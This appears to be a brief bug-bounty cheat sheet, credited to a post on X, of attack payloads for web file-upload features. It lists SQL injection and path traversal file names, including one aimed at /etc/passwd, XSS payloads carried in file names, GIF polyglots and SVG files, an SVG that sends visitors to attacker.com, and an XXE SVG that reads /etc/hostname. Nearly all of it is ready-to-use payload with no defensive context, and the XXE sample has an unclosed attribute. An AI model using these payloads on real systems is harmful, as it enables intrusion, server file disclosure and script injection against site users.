Chaining Vulnerabilities through File Upload  - https://x.com/SuhradMakwana/status/1720754692907782553?s=20

# SLQi

'sleep(20).jpg
sleep(25)-- -.jpg

# Path traversal

../../etc/passwd/logo.png
../../../logo.png


# XSS

->  Set file name filename="svg onload=alert(document.domain)>" , filename="58832_300x300.jpg<svg onload=confirm()>"

->  Upload using .gif file
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;

-> Upload using .svg file
<svg xmlns="http://w3.org/2000/svg" onload="alert(1)"/>

-> <?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" xmlns="http://w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("HolyBugx XSS");
   </script>
</svg>


# Open redirect 

<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='https://attacker.com'"
xmlns="http://w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
</code>


# XXE 

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://w3.org/2000/svg" xmlns:xlink="http://w3.org/1999/xlink" version="1.1
<text font-size="40" x="0" y="16">&xxe;</text>
</svg>